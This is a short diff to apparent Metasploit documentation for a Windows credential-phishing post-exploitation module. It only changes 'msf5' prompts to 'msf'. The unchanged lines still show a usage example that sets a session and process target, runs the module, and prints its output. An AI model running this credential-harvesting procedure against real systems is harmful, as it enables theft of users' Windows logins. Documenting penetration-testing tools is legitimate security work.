@@ -39,9 +39,9 @@
   msf > use post/windows/gather/phish_windows_credentials
   msf post(windows/gather/phish_windows_credentials) > set SESSION 1
     SESSION => 1
-  msf5 post(windows/gather/phish_windows_credentials) > set PROCESS *
+  msf post(windows/gather/phish_windows_credentials) > set PROCESS *
     PROCESS => *
-  msf5 post(windows/gather/phish_windows_credentials) > exploit
+  msf post(windows/gather/phish_windows_credentials) > exploit
 
   [+] PowerShell is installed.
   [*] Monitoring new processes.
